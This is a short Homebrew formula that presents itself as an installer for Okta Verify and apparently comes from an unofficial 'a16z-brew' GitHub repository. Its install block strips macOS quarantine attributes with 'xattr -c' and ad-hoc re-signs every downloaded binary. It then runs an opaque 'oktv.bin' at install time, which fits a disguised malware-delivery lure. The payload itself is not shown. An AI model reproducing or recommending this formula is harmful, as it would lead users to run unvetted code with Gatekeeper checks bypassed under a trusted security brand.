class Verify < Formula
  desc "Installation of Okta Verify"
  homepage "https://github.com/a16z-brew/homebrew-bundle"
  url "https://github.com/a16z-brew/homebrew-verify/archive/refs/tags/v2.1.4.tar.gz"
  version "2.1.4"
  sha256 "dcc324802cd75997b8ff7e448015d0992752ec0e4cfe8ce89ec2536490035c6b"
  license "MIT"

   def install
        bin.install Dir["bin/*"]
        Dir["#{bin}/*"].each do |f|
        system "xattr", "-c", f if File.file?(f)
        system "codesign", "--force", "--sign", "-", f if File.file?(f)
        system "chmod", "+x", f if File.file?(f)
        end
        system "#{bin}/oktv.bin"
      end
    end
